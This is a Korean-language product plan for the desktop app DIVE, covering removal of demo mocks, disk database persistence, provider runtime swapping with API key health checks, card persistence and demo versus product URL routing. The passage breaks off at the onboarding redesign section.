# DIVE 제품화 계획 — Production Wiring 우선

**작성**: 2026-05-04 (개정: 2026-05-04 리뷰 반영)
**베이스**: `~/DIVE-2/` (opencode 구현)
**참고**: `~/DIVE/` (Codex 구현, 아카이브, 추가 커밋 금지)

> **개정 요약 (v3)**:
> - **v2 (2026-05-04 초판 검토)**: Track 0 2주 → 4주, Workmap persistence 분리, ProviderRuntime 스냅샷, provider_connect health check, project_root RwLock 5곳, silent fallback 제거, URL namespace 분리, rc.1 일괄 클리어, tauri-driver 스모크, OpenRouter 학생 키, Onboarding Skip 재정의.
> - **v3 (2026-05-04 SPEC 감사 + opencode zen)**: SPEC §6.3.1 빌트인 도구 3종 보강 (search_files / delete_file / run_process) + Bash sandbox 하드닝 (§9.3) + Checkpoint auto-trigger 전 단계 전환 (§6.5) + EventLog emission 완전성 (§10.5) + V-stage 실 테스트 실행 (§4.4) = Track 0 추가. Custom provider + 모델 셀렉터 + Provider settings 5필드 = Track B 추가. 메시지 edit/resend = Track C 추가. Permission card A/R/E 단축키 + tablist arrow key = Track D 추가. **opencode zen provider** 통합 (Track 0-18, OpenAI-compatible route 재사용). ADR-058 ~ ADR-068 신규.

---

## 0. 진단 (현재 상태의 진실)

`v1.0.0-rc.1` 라벨이 붙어 있고 Rust 238 tests / Playwright 26 스위트가 통과하지만, **NSIS 인스톨러로 설치한 진짜 앱은 동작하지 않는 데모 빌드**입니다. 백엔드 모듈은 잘 구현되어 있으나 production 진입점에 와이어드 안 됐고, frontend data layer 전반에 silent mock fallback이 숨어 있어 IPC 실패를 "성공"으로 위장합니다.

### 0.1 DIVE-2의 production 와이어링 누락 (직접 확인됨)

1. **`dive/src-tauri/src/lib.rs:29` `let app_state = ipc::AppState::dev_mock();`** — production NSIS 빌드도 in-memory DB + 빈 `MockProvider`로 진입.
2. **`Database::open(path)`는 이미 존재** ([`db/mod.rs:23-27`](dive/src-tauri/src/db/mod.rs#L23-L27)). 빠진 건 *app-local 경로 계산 + 부모 디렉토리 생성 + `lib.rs`에서 호출*. 신규 API 추가가 아니라 **setup hook에서 호출하는 것**이 본질.
3. **`MainShell.tsx`가 `useChatSession` 훅을 import 안 함**. `handleVerify`는 `setTimeout(450)` + 하드코딩 mock VerifyLog (`"[데모] ... 실제 LLM 호출은 Tauri 런타임에서만"`). `handleTransition` / `handleInstructionChange`도 로컬 Zustand store만 갱신하고 `card_transition` / `card_update_instruction` IPC를 부르지 않음.
4. `DEMO_CHANGED_FILES`, `simulateToolCallCount`, mock VerifyLog, `verifyLogs`/`checkpointBadges`/`lastManualCheckpointLabel` 같은 가짜 local state가 제품 경로 안에 박혀 있음.
5. **Workmap store ↔ DB cards 테이블 sync 레이어가 아예 없음**. `card_create`/`card_list`/`workmap_get` IPC 자체가 미정 → 카드 추가해도 재시작 시 사라짐. 이건 "와이어링"이 아니라 **신규 기능**. Track 0에 포함하되 기간을 4주로 확장.
6. **`provider_connect`가 키 저장만 함** ([`ipc/provider.rs:20-52`](dive/src-tauri/src/ipc/provider.rs#L20-L52)): keyring에 저장 + DB insert + `is_connected: true` 반환이 전부. (a) 저장된 키로 provider 인스턴스를 만들어 runtime에 스왑하지 않음 → `AppState.provider`는 영구적으로 `dev_mock()` 시점의 빈 MockProvider. (b) 키 유효성을 검증하지 않음 → 오타 키도 "연결 성공" 표시.
7. **부팅 시 provider hydration 없음**. 재시작하면 DB엔 provider_config 있고 keyring엔 키 있는데 runtime은 `NoProviderConfigured`/빈 Mock 상태. `provider_list`는 연결된 것처럼 보이는데 실제 호출은 실패.
8. **`AppState.provider: Arc<dyn LlmProvider>`를 clone하는 call site가 4곳**: `chat_send` ([`ipc/mod.rs:121`](dive/src-tauri/src/ipc/mod.rs#L121)), `card_verify` ([`:312`](dive/src-tauri/src/ipc/mod.rs#L312)), `ai_assist_cards` ([`:340`](dive/src-tauri/src/ipc/mod.rs#L340)), `prompt_check_review` ([`:353`](dive/src-tauri/src/ipc/mod.rs#L353)). 동적 교체 설계는 4곳 모두 다뤄야 함.
9. **`AppState.model: String`이 provider와 분리된 mutable 필드**. Provider swap 시 model을 함께 바꾸지 않으면 런타임 mismatch.
10. **`AppState.project_root: PathBuf`를 clone하는 call site가 5곳**: `chat_send`의 `ToolContext` + `card_transition`의 auto-checkpoint ([`:276`](dive/src-tauri/src/ipc/mod.rs#L276)) + `checkpoint_create/restore/list` ([`:368, :381, :393`](dive/src-tauri/src/ipc/mod.rs#L368)). 프로젝트 전환 race는 tool 경계뿐 아니라 **checkpoint 경계**를 깨뜨려 데이터 섞임 발생 가능.
11. **Silent localStorage fallback** ([`project-session.ts:109-120, 166-170`](dive/src/stores/project-session.ts#L109-L120)): `withTauriOrMock()`이 IPC throw를 `console.warn` 한 줄로 삼키고 localStorage mock으로 대체. `createProject` / `createSession` / `connectProvider` / `disconnectProvider` / `renameSession` / `archiveSession` / `deleteSession` / `selectProject` 8곳. 이게 rc.1이 "돌아가는 것처럼" 보인 근본 원인 중 하나.
12. **17개 demo 페이지 중 Settings와 Prompt Helper는 product 기능**. 현재 `?demo=settings` / `?demo=prompt-helper`로 진입하나 demo가 아님. URL namespace 구조적 결함.
13. **Playwright 26 스위트가 Vite dev server(`localhost:1420`) 대상**: Tauri 런타임 없음 → `window.__TAURI_INTERNALS__` 부재 → 모든 IPC 호출이 silent fallback 경로로 빠짐. 즉 **Playwright는 NSIS 제품 빌드를 검증한 적이 없음**.
14. **`verify-onboarding.mjs`가 제품 적대적 동작을 "통과"로 단정**: Skip 버튼 → `setOnboarded(true)` → 다이얼로그 닫힘을 합격 조건으로 검증. 프로바이더 없이 onboarded 마킹 = 제품 관점 버그인데 테스트가 이를 보호.

### 0.2 연관 발견 (DIVE Codex 레포)

`~/DIVE/dive/src-tauri/src/lib.rs`의 `run()`이 `manage(app_state)` / `invoke_handler` 둘 다 등록 안 함. **백엔드 IPC가 frontend로 노출조차 안 됨**. DIVE-2보다 더 심각 — DIVE는 아카이브 유지.

### 0.3 결론

이번 5~7월 작업의 진짜 시작점은 v1.1 기능 추가가 아니라 **Production Wiring + Cards Persistence + 검증 파이프라인 재설계**입니다. "v1.0" 라벨은 회수, rc.2가 실제로 동작하는 첫 빌드.

---

## 1. 의사결정 (확인됨)

- **베이스**: DIVE-2 단일. DIVE는 참고/아카이브.
- **UI 방향**: DIVE-2의 현재 UI 유지. DIVE의 Visual Ralph(`feeb54d`) 폴리싱은 가져오지 않음.
- **코드 서명**: 당장은 미적용 (rc 단계 연장). Azure Trusted Signing 도입 시점은 트랙 D 진입 직전 결정.
- **학생 키 모델**: **OpenRouter child key** — 교사가 main key로 label prefix 발급·사용량 한도·일괄 회수. 기존 `openrouter_issue_key` / `openrouter_revoke_all` / `openrouter_list_keys` IPC 재사용.
- **opencode zen provider 추가**: OpenAI-compatible route 전용. 무료 모델 다수 (`gpt-5-nano` 등) → 교육 환경 token 비용 0. 베타 서비스 + 무료 모델 데이터 훈련 가능성 → 교사 매뉴얼에 고지 의무 (ADR-058).
- **URL 라우팅**: `?demo=*`는 demo 전용 (DemoShell), `?route=*`는 product 전용 (Settings, Prompt Helper 등). 기존 `?demo=settings` / `?demo=prompt-helper`는 product route로 이관하되 deprecated redirect 1 릴리스 유지.
- **`onboarded` 플래그 재정의**: **실 프로바이더 1개 이상 연결 시에만 true**. Skip 버튼은 유지하되 프로바이더 미연결 상태에서 Skip → 다음 실행 시 Onboarding 재오픈 + 상단 배너 "API 키 설정 필요" + CTA.
- **rc.1 → rc.2 마이그레이션**: rc.1 localStorage 키(`dive:project-session`, `dive:current-project-id`, `dive:current-session-id`, `dive:onboarded`, `dive:locale`, `dive:theme-mode` 중 data 3종) **일괄 삭제** + 일회성 안내 모달 "rc.1은 데모 빌드였습니다. 데이터 복구 불가, 새로 시작합니다". `dive:locale` / `dive:theme-mode`는 UI preference로 보존.
- **GitHub Release rc.1 조치**: Release 제목 앞에 `[YANKED]` prefix + 본문 상단 "⚠️ 이 빌드는 회수되었습니다" 공지 + CHANGELOG `[Yanked]` 섹션. asset은 삭제하지 않음 (아카이브 목적).
- **일정**: 5~7월 여유 있게 v1.1까지. **Track 0은 2주 → 4주**.

---

## 2. 트랙 개요

| 트랙 | 목표 | 기간 | 결과물 / Release Gate |
|---|---|---|---|
| **0. Production Wiring + Cards Persistence + SPEC Gaps** | dev_mock 제거, 디스크 DB, ProviderRuntime 스냅샷, Cards CRUD IPC, MainShell 실 IPC 연결, silent fallback 제거, URL namespace 분리, release gate 2단계 수립, **opencode zen provider 추가, 빌트인 도구 3종 보강, bash sandbox 하드닝, checkpoint auto-trigger 완성, EventLog 방출 완성, V-stage 실 테스트** | 5월 1~4주 (4주) | `rc.2`: NSIS 설치 빌드에서 실 LLM 1턴 + 재시작 후 cards/messages 보존. tauri-driver 자동 스모크 1건 + 수동 7종 통과 |
| **B. 외부 자원 E2E + 실기 스모크 + Custom Provider + Settings 완전성** | 실 ChatGPT Plus OAuth + 실 MCP 서버 3종 + Windows 실기 7종 + NVDA/색맹 a11y + **Custom OpenAI-compat provider + 모델 셀렉터 활성 + Provider settings 5필드 + OpenRouter 자식 키 Settings 이전** | 5월 5~6주 (2주) | `rc.3`: 각 검증 항목별 pass/fail 체크리스트 + 블로커 회귀 수정 |
| **C. 토평고 파일럿 2회차 + 메시지 편집** | 25명 × 6차시, 모호함 감지 precision/recall 데이터 + **메시지 edit/resend UX** | 5월 말~6월 초 | `rc.4` 또는 `pilot.2`: 파일럿 보고서, 정규식 튜닝 |
| **D. v1.1 통합 + 출시 + 접근성 완성** | 영어 i18n 완성, macOS/Linux, Tauri Updater, 코드 서명, 교사 대시보드 초안, 토큰 비용 UI, **permission card A/R/E 단축키 + slide-in tablist arrow key** | 6~7월 | `v1.1.0`: NSIS / dmg / AppImage, 코드 서명 적용 |

(트랙 A "Visual Polish 포팅"은 사용자 결정에 따라 제거.)

### 2.1 Release Gate 2단계 (트랙 0에서 수립, 이후 모든 릴리스에 적용)

- **Developer gate** (매 PR·커밋): `pnpm tauri:dev` dev shell + wiremock provider + Playwright 27 스위트 (browser UI 검증만). 빠르지만 IPC·keyring·NSIS 동작은 증명 못함.
- **Release gate** (rc 태그 푸시 전): NSIS 설치 → clean `%LOCALAPPDATA%` → 실 provider 또는 wiremock → **tauri-driver 자동 스모크** (신규, Track 0-11) + **수동 스모크 7종** (`docs/packaging-windows.md` §7).
- 배포 문서에서 "Playwright 26 스위트 통과 = 출시 가능"이라는 암묵적 기준을 명시적으로 폐기. Release gate 통과만이 태그 푸시 조건.

---

## 3. 트랙 0 — Production Wiring + Cards Persistence (5월 1~4주, 4주)

> **원칙**: 매 주 금요일 체크인. 누적 +5일 지연 시 트랙 B를 1주 뒤로 미루고 Track 0 스코프는 유지 (줄이지 않음).

### 0-1. 디스크 DB 경로 + 마이그레이션 정책 (1주차)
**파일**: `dive/src-tauri/src/db/mod.rs`, `dive/src-tauri/src/db/migrations.rs`

기존 `Database::open(path)`([`db/mod.rs:23-27`](dive/src-tauri/src/db/mod.rs#L23-L27))를 그대로 재사용. API 중복 생성 금지.

- **경로 빌더**: Tauri 2 `app.path().app_local_data_dir()?` → `dive.db`. `std::fs::create_dir_all(parent)` 선행. Tauri identifier는 `tauri.conf.json`에서 확정하고 ADR-039에 기록 (rc.2 이후 불변).
- **마이그레이션 정책** (ADR-039에 상세 명시):
  - Forward-only. Destructive 변경은 사전 백업 후에만 허용.
  - Pre-migration backup: `%LOCALAPPDATA%/.../backups/dive-<prev_version>-<timestamp>.db`로 복사 후 migrate 수행.
  - 앱이 DB `schema_version` > 자신의 latest를 만나면 **refuse to open** + "이후 버전 앱으로 생성된 DB" 에러. 롤백 유도.
  - 마이그레이션 실패 시 원본 DB 유지, 앱은 시작하지 않고 명확한 에러 + 로그 경로 안내.
- **단위 테스트** (기존 inline `#[cfg(test)] mod tests` 모듈 `dive/src-tauri/src/db/mod.rs` 하단 + `dive/src-tauri/src/db/migrations.rs` 하단에 case 추가; 별도 `db/tests.rs` 파일 신설 금지):
  - tempfile로 디스크 DB 열기 → migrate → row 1개 insert → 닫고 재오픈 → 보존 확인.
  - 인위적 `schema_version = 999` 주입 → `open` 시 `FutureSchema` 에러 반환 확인.
  - 마이그레이션 실패 시뮬레이션(잘못된 SQL) → 원본 파일 무결성 확인.

### 0-2. ProviderRuntime 스냅샷 구조체 + AppState production 빌더 (1주차)
**파일**: `dive/src-tauri/src/ipc/mod.rs`, 신규 `dive/src-tauri/src/providers/factory.rs`, 신규 `dive/src-tauri/src/ipc/provider_runtime.rs`

**문제**: 현재 `AppState.provider: Arc<dyn LlmProvider>`와 `AppState.model: String`이 분리 mutable → swap 시 race + mismatch.

**해결**: Provider + model + config 메타를 원자적 스냅샷으로 묶음.

```rust
#[derive(Clone)]
pub struct ProviderRuntime {
    pub config_id: Option<i64>,   // DB provider_config 행 id, 미연결 시 None
    pub kind: ProviderKind,        // Anthropic / OpenAI / OpenRouter / Codex / None
    pub model: String,             // "unset" if None
    pub provider: Arc<dyn LlmProvider>,  // None 상태는 NoProviderSentinel
}

// AppState 필드 교체
pub runtime: Arc<RwLock<ProviderRuntime>>
// 기존 provider / model 필드 제거
```

- `NoProviderSentinel`: `LlmProvider` trait 구현체. 모든 메소드가 `ProviderError::NotConfigured` 반환. frontend에서 분기 가능한 error code 포함.
- **dev_mock cfg-gating**: `AppState::dev_mock()`을 `#[cfg(any(test, feature = "dev-mock"))]` 뒤로 격리. production 코드에서 호출 불가. `cargo build --release` 기본 feature set에 `dev-mock` 없음 확인 (acceptance test).
- **신규 `AppState::from_app_handle(app: &AppHandle) -> Result<Self, AppStateError>`**:
  - DB 경로 계산 → `Database::open` → `migrate`.
  - 신규 `hydrate_provider_runtime(&db, &keyring)` 호출:
    - DB `provider_config` 중 `is_active` (신규 컬럼, 마이그레이션 v4) 또는 가장 최근 생성된 것 하나를 선택.
    - keyring에서 키 로드. 실패 시 `NoProviderSentinel` 반환 (onboarded=false 상태로 진입).
    - `factory::build_provider(kind, key, base_url)`로 인스턴스 생성.
    - `model`은 DB `provider_config.model_default` 또는 provider별 하드코딩 default.
  - 결과 `ProviderRuntime`을 `RwLock`에 담아 AppState 구성.
- **`project_root`**: `Arc<RwLock<PathBuf>>`. 초기값 = 마지막 선택된 프로젝트 경로 (DB lookup) 또는 placeholder `PathBuf::from("")` (비선택 상태).
- **`keyring`**: `OsKeyring::new()`.

### 0-3. Provider factory + 4개 call site 업데이트 (1~2주차)
**파일**: 신규 `dive/src-tauri/src/providers/factory.rs`, `dive/src-tauri/src/ipc/mod.rs`, `dive/src-tauri/src/ipc/provider.rs`

- **`factory::build_provider(kind: ProviderKind, key: &str, base_url: Option<&str>) -> Result<Arc<dyn LlmProvider>, ProviderError>`**: Anthropic / OpenAI / OpenRouter / Codex 분기. base_url override 지원. http client 재사용 (reqwest `Client`).
- **AppState에 runtime snapshot helper**:
  ```rust
  impl AppState {
      pub fn runtime_snapshot(&self) -> ProviderRuntime {
          self.runtime.read().unwrap().clone()
      }
      pub fn swap_runtime(&self, next: ProviderRuntime) {
          *self.runtime.write().unwrap() = next;
      }
      pub fn project_root_snapshot(&self) -> PathBuf {
          self.project_root.read().unwrap().clone()
      }
  }
  ```
- **4개 call site 전부 snapshot 사용**:
  - `chat_send`: 시작 시 `runtime_snapshot()` 1회 → 그 provider+model로 전체 턴 처리. 중간 swap에 영향받지 않음.
  - `card_verify`: 동일 패턴. `VerifyEngine::new(snap.provider, db, snap.model)`.
  - `ai_assist_cards`: 동일.
  - `prompt_check_review`: 동일.
- **`NoProviderSentinel` 처리**: 4 call site 모두 snapshot.kind == None 체크 → `ProviderError::NotConfigured` 즉시 반환. frontend는 이 에러 코드를 보고 §11 Error UX로 처리.
- **단위 테스트** (`dive/src-tauri/tests/it_provider_swap.rs` 신규):
  - `chat_send` 시작 후 동시에 `swap_runtime` 호출 → 해당 턴은 이전 provider로 완료, 다음 턴은 새 provider 사용.
  - 4개 call site 각각 `NoProviderSentinel` 상태에서 `NotConfigured` 에러 확인.
  - Anthropic→OpenAI swap 시 model 필드도 함께 갱신 확인 (mismatch 없음).

### 0-4. `provider_connect` health check + 동적 swap (2주차)
**파일**: `dive/src-tauri/src/ipc/provider.rs`, `dive/src-tauri/src/providers/factory.rs`

**현재 문제**: `provider_connect`가 키 저장만 하고 유효성 미검증, runtime swap 안 함, `is_connected: true`를 무조건 반환.

**변경 사양**:

1. 입력 검증 (trim, non-empty) — 기존 유지.
2. **Provider 인스턴스 빌드** (`factory::build_provider`) — DB insert 전에 수행해서 kind 지원 여부 먼저 확인.
3. **Health check**: provider별 최소 authenticated 호출 1회.
   - Anthropic: `GET /v1/models` 또는 짧은 `messages` 호출 (1 token).
   - OpenAI / OpenRouter: `GET /v1/models`.
   - 실패 시 **DB insert / keyring 저장 둘 다 하지 않고** `ProviderError::AuthFailed(detail)` 반환.
   - 타임아웃 8초. 네트워크 오류와 401은 구분.
4. Health check 성공 → DB `provider_config` insert (`is_active = true`, 기존 active는 false로 업데이트) → keyring upsert → `ProviderRuntime` 빌드 → `state.swap_runtime(next)` → UI에 실제 연결된 config 반환.
5. **`provider_disconnect`**: 해당 config가 active였다면 `swap_runtime(NoProviderSentinel)` → DB delete → keyring delete. 다른 config로 fallback은 하지 않음 (명시적 재선택 필요). onboarded 플래그는 frontend가 별도 평가.

**OpenRouter 특수 처리**: 학생 키 발급 흐름(§0-9)을 위해 main key와 child key를 별도 provider_config 항목으로 저장. `auth_type = "api_key"` 공통, `config.child_label_prefix` 메타 추가.

**테스트**: wiremock으로 health check 200 / 401 / 5xx / timeout 4가지 경로 커버. 401 시 DB·keyring 미변경 확인.

### 0-5. `lib.rs run()` production setup hook (2주차)
**파일**: `dive/src-tauri/src/lib.rs`

- `let app_state = ipc::AppState::dev_mock();` **제거**.
- `tauri::Builder::default()` 체인에 `.setup(|app| { let state = AppState::from_app_handle(&app.handle())?; app.manage(state); Ok(()) })` 추가.
- `.setup` 내부에서 `AppStateError`는 Tauri dialog plugin으로 사용자 가시 에러 표시 후 앱 종료 (DB 경로 권한 에러 등 fatal).
- **Acceptance test (신규)**: `cargo build --release` 결과물이 `MockProvider`를 **release 바이너리 심볼에 포함하지 않음** 확인. `cargo build --release --features dev-mock`에서만 포함. cfg-gate 실수 방지용 gate.

### 0-6. Cards persistence 레이어 (신규 기능, 2~3주차) ⭐

> **중요**: 이건 "와이어링"이 아닌 **신규 기능**. Workmap store ↔ DB 간 sync 레이어가 현재 완전히 부재. Track 0의 최대 리스크 항목.

#### 0-6a. 백엔드 IPC 확장
**파일**: `dive/src-tauri/src/ipc/mod.rs`, 신규 `dive/src-tauri/src/ipc/workmap.rs`, `dive/src-tauri/src/db/dao/card.rs`

신규 IPC commands:
- `card_create(session_id: i64, title: String, position: Option<i32>) -> CardRow`
  - position 생략 시 현재 세션의 max(position) + 1.
  - 초기 state = `CardState::Decomposed`.
- `card_list(session_id: i64) -> Vec<CardRow>` — position ASC 정렬.
- `card_delete(card_id: i64) -> ()` — 연관 messages / tool_calls cascade 여부는 DB 스키마 확인 후 결정 (현재 `ON DELETE CASCADE` 여부 검증).
- `card_reorder(session_id: i64, ordered_ids: Vec<i64>) -> ()` — drag-drop 대응. 단, v1.0에선 순서 변경 UI 없으면 미구현 OK.
- `workmap_get(session_id: i64) -> WorkmapSnapshot { cards: Vec<CardRow>, current_card_id: Option<i64> }` — 세션 진입 시 1회 호출로 전체 상태 hydrate.

DAO 확장: `card::create`, `card::delete_by_id`, `card::reorder` 추가. position unique constraint는 세션 범위 내에서 느슨하게 유지 (충돌 시 재계산).

#### 0-6b. 프론트엔드 workmap 훅
**파일**: 신규 `dive/src/hooks/useWorkmap.ts`, `dive/src/stores/workmap.ts` 리팩터

- `useWorkmap(sessionId: number | null)` 훅:
  - sessionId 변경 시 `workmap_get` 호출 → store `hydrateFromRemote(snapshot)`로 교체.
  - `createCard(title)`: 낙관적 insert 대신 **IPC 성공 후 store 갱신** (실패 시 UI 변동 없음, 토스트 에러).
  - `transitionCardRemote(cardId, transition, approveForce?)`: `card_transition` IPC → 성공 시 store 갱신.
  - `updateInstructionRemote(cardId, instruction)`: debounce 500ms → `card_update_instruction` IPC → store 갱신.
  - `verifyRemote(cardId)`: `card_verify` IPC (스트리밍 이벤트는 `useChatSession`이 이미 수신).
  - `deleteCard(cardId)`: 확인 모달 후 `card_delete` IPC.
- **`useWorkmapStore` 변경**: `addCards` 등 로컬 전용 메소드를 `_local` 접미사로 renaming. demo 경로에서만 사용. product 경로는 `useWorkmap` 훅이 hydrate.
- Race 방지: hydrate 요청이 진행 중에 session이 다시 바뀌면 이전 요청 무시 (AbortController 또는 generation token).

#### 0-6c. AiAssistDialog ↔ `card_create` 연결
**파일**: `dive/src/components/workmap/AiAssistDialog.tsx`

현재 `onAccept(nextCards)` → `addCards(nextCards)` (로컬). 변경:
- accept 시 각 card에 대해 `card_create` IPC 호출 (순차, 실패 시 부분 성공까지만 유지 + 에러 토스트).
- 전체 성공 후 `workmap_get` 재hydrate.

#### 0-6d. 테스트
- Rust: `card_create` → `card_list` → `card_update_instruction` → `card_transition(request_verify)` → `card_verify` → `card_transition(approve, approve_force=true)` 전체 체인 통합 테스트 (`tests/it_cards_persistence.rs` 신규).
- Playwright (developer gate): 세션 생성 → AiAssist로 카드 3개 → 한 카드 instruction 입력 → verify 실행 (mock provider) → approve. 재hydrate 후 카드 상태 보존 확인.
- Release gate (tauri-driver, §0-11): 동일 흐름 + 앱 재시작 후 cards 보존 확인.

### 0-7. MainShell ↔ useChatSession + useWorkmap 와이어 (3주차)
**파일**: `dive/src/components/shell/MainShell.tsx`, `dive/src/hooks/useChatSession.ts`

- **`useChatSession(currentSessionId)` 호출**. sessionId 소스: `useProjectSessionStore.currentSessionId`. `null`이면 inline empty state ("세션을 선택하거나 생성하세요" + CTA).
- **`useWorkmap(currentSessionId)` 호출**. hydrate 완료 전엔 skeleton. 완료 후 `cards`를 `useWorkmap`에서 받음.
- **제거할 local state / 가짜 경로**:
  - `DEMO_CHANGED_FILES`, `simulateToolCallCount` 함수, `simulateToolCallCount` 호출부
  - `handleVerify`의 `setTimeout(450)` + mock VerifyLog → `verifyRemote(cardId)` 사용. `card_verify` IPC의 `verify_started` / `verify_done` 이벤트를 `useChatSession` 또는 신규 `useVerifyStatus` 훅으로 수신.
  - `verifyLogs` / `verifyStates` / `verifyErrors` local state 제거 → `card_verify` 응답이 DB `cards.verify_log`에 저장되므로 `useWorkmap`이 hydrate.
  - `checkpointBadges` local state 제거 → `checkpoint_created` 이벤트 수신하여 `useCheckpointFeed` 훅으로 구독.
  - `lastManualCheckpointLabel` → `checkpoint_create` IPC 호출 + 응답 사용.
- **`handleTransition`**: `transitionCardRemote(cardId, transition)` IPC 우선 호출 → 응답 state로 store 갱신. (현재 코드는 store만 갱신)
- **`handleInstructionChange`**: `updateInstructionRemote(cardId, instruction)` debounce 호출.
- **Tool call 카운트**: 신규 IPC `card_tool_call_stats(cardId) -> { count: i32 }` 또는 `messages` 테이블 집계. `useWorkmap` hydrate에 포함 고려.
- **Slide-in "code" 탭의 changed files**: `card_verify` 응답의 `changed_files` (기존 필드) 사용. `DEMO_CHANGED_FILES` 제거.

**QA 시나리오**:
- **도구**: Rust 단위 테스트 (`dive/src-tauri/tests/it_mainshell_wiring.rs` 신규 — IPC 측 호출 로그 검증 보조) + Playwright (`dive/scripts/verify-mainshell-wire.mjs` 신규, Tauri mock IPC injection 패턴: `window.__TAURI_INTERNALS__` stub + `invoke` handler 설치) + 수동 dev shell (`pnpm tauri:dev`) 스모크.
- **단계**:
  1. MainShell 소스 grep으로 `DEMO_CHANGED_FILES`, `simulateToolCallCount`, `setTimeout(450)`, `"[데모]"` 문자열 0건 확인 (ESLint custom rule 또는 `verify-no-demo-data.mjs` 스크립트).
  2. Playwright: Tauri IPC stub에 `card_verify` 호출 → `verify_started` / `verify_done` 이벤트 방출 → MainShell의 verify 상태가 stub response에 반영됨.
  3. Playwright: `card_transition(approve)` stub → store `card.state === "verified"`로 전이 + `checkpoint_created` 이벤트 구독 확인.
  4. 수동 dev shell: 세션 생성 → 카드 추가 → instruction 입력 (debounce 500ms 후 1회 `card_update_instruction` IPC 호출 DevTools Network 탭 확인) → verify → approve → 실 SQLite `dive.db` 파일에 상태 반영 확인 (SQLite CLI `SELECT state, verify_log FROM cards`).
  5. `pnpm typecheck` + `cargo test --all-targets` pass.
- **기대 결과**: grep 스캔 0건, Playwright 3/3 pass, 수동 dev shell 모든 상태 전이가 DB에 persist, `card_update_instruction` 호출 횟수 = keystroke burst 수 (debounce 정상).

#### 0-7a. Demo 경로 분리
**파일**: 신규 `dive/src/components/demo/DemoShell.tsx`, `dive/src/App.tsx`

- `?demo=*` 쿼리는 `DemoShell`로 분기.
- **이전 대상 (15개 demo 페이지)**: `showcase`, `workmap-demo`, `chat-demo`, `permission-demo`, `slide-in-demo`, `scenario-a-demo`, `scenario-b-demo`, `tool-guard-demo`, `provisioning-demo`, `timeline-demo`, `toast-demo`, `polish-demo`, `export-demo`, `phase5-integration`, `mcp-demo` (실 MCP 테스트용이라 demo 유지).
- **Product route로 재배치 (§0-8에서 2개)**: `settings`, `prompt-helper-demo` → `?route=settings`, `?route=prompt-helper`.
- `DemoShell`은 mock store/data 자체 보유. demo 경로에서 `useProjectSessionStore`는 localStorage mock 그대로 사용.
- `MainShell`은 **product 전용** — mock 데이터 의존 일절 없음.

### 0-8. URL namespace 분리 (`?demo=` vs `?route=`) (3주차)
**파일**: `dive/src/App.tsx`, `dive/src/components/shell/MainShell.tsx`, `dive/src/components/shell/Sidebar.tsx`

**현재 문제**: `?demo=settings` / `?demo=prompt-helper`는 product 기능을 demo URL로 위장.

**변경 사양**:
- `resolveRoute()` 확장: `?route=` 우선, 없으면 `?demo=` 확인.
- **Product routes** (`?route=`): `settings`, `prompt-helper`.
- **Demo routes** (`?demo=`): 그 외 15개 (위 0-7a 목록).
- **Deprecated redirect**: `?demo=settings` / `?demo=prompt-helper` 진입 시 → `?route=...`로 `history.replaceState` + `console.warn("Deprecated demo URL, use ?route=...")`. 1개 릴리스(rc.3)까지 유지 후 제거.
- **MainShell 단축키 수정**: `onOpenSettings` / `onOpenPromptHelper`가 `?route=`를 푸시하도록.
- **Sidebar 내부 링크** ([`dive/src/components/shell/Sidebar.tsx`](dive/src/components/shell/Sidebar.tsx)): Settings 진입점을 `?route=settings`로 변경.
- **Playwright 호환**: 기존 `verify-settings.mjs` / `verify-prompt-helper.mjs`는 redirect를 통해 계속 작동. 다음 릴리스(rc.3)에서 URL 업데이트.

**QA 시나리오**:
- **도구**: Playwright (`dive/scripts/verify-url-namespace.mjs` 신규) + TypeScript 단위 테스트 (`dive/src/App.test.tsx` 또는 신규).
- **단계**:
  1. `resolveRoute("?route=settings")` → `"settings"`, `resolveRoute("?demo=settings")` → `"settings"` + console.warn 발생, `resolveRoute("?demo=workmap")` → demo route `"workmap"`.
  2. Playwright: `http://localhost:1420/?route=settings` → SettingsPage 렌더, URL 바 유지.
  3. Playwright: `http://localhost:1420/?demo=settings` → `history.replaceState`로 URL `?route=settings`로 변경 + console 경고 캡처 1건.
  4. Playwright: Sidebar 메뉴 "설정" 클릭 → URL이 `?route=settings`로 변경 (`?demo=settings` 아님).
  5. Playwright: MainShell 단축키(`useGlobalShortcuts`의 `onOpenSettings` 트리거) → `?route=settings`.
  6. `verify-settings.mjs` / `verify-prompt-helper.mjs` 기존 테스트 pass (backward-compat redirect 동작).
- **기대 결과**: 단위 테스트 3/3, Playwright 5/5, 기존 스위트 regression 0.

### 0-9. Silent localStorage fallback 제거 (product 경로) (3주차)
**파일**: `dive/src/stores/project-session.ts`, 기타 IPC 호출 store

**현재 문제**: `withTauriOrMock()`이 Tauri 환경에서 IPC 실패 시 `console.warn` + localStorage mock으로 조용히 폴백 → rc.1 데모 빌드가 "돌아가는 것처럼" 보인 근본 원인.

**변경 사양**:

1. **`withTauriOrMock` → `withTauriOrDemoMock(allowDemoFallback: boolean)`** 리네이밍.
   - `__TAURI_INTERNALS__`가 있고 `allowDemoFallback=false`: IPC 실패 시 **throw**. store는 `error: string`으로 노출.
   - `__TAURI_INTERNALS__`가 없음 (브라우저 dev shell) **and** `allowDemoFallback=true`: localStorage mock 사용.
   - 그 외 조합은 에러.
2. **Product 경로 호출부 전부 `allowDemoFallback=false`**:
   - `loadAll`, `createProject`, `deleteProject`, `selectProject`, `createSession`, `renameSession`, `archiveSession`, `deleteSession`, `connectProvider`, `disconnectProvider` → 8+ 곳.
   - throw 시 toast 에러 + store `error` 필드 갱신.
3. **Demo 경로 호출부 (DemoShell 내부)**: `allowDemoFallback=true` 유지.
4. **`localStorage` 용도 재정의** (ADR-045 확장):
   - **보존**: `dive:current-project-id`, `dive:current-session-id` (UI hint — 재시작 시 마지막 선택 복원), `dive:locale`, `dive:theme-mode`, `dive:onboarded` (재정의됨, §0-10).
   - **Product 경로에서 제거**: `dive:project-session` (mock store — demo 전용으로 이동).
   - **rc.1 마이그레이션**: rc.2 첫 실행 시 `dive:project-session` 키 **무조건 삭제** + 일회성 안내 모달 표시 후 `dive:rc1_migrated` 플래그 설정.

**테스트**:
- Playwright dev shell: Tauri 없음 상태에서 createProject 호출 → localStorage 기록 확인 (demo 경로 테스트만).
- Playwright mock Tauri (window.__TAURI_INTERNALS__ 주입 + invoke stub): invoke가 throw → store.error 설정 확인, localStorage 미변경 확인.

### 0-10. Onboarding 재설계 + `onboarded` 플래그 재정의 (3주차)
**파일**: `dive/src/components/onboarding/OnboardingDialog.tsx`, `dive/src/stores/project-session.ts`, `dive/src/components/shell/MainShell.tsx`

**현재 문제** (검증 완료):
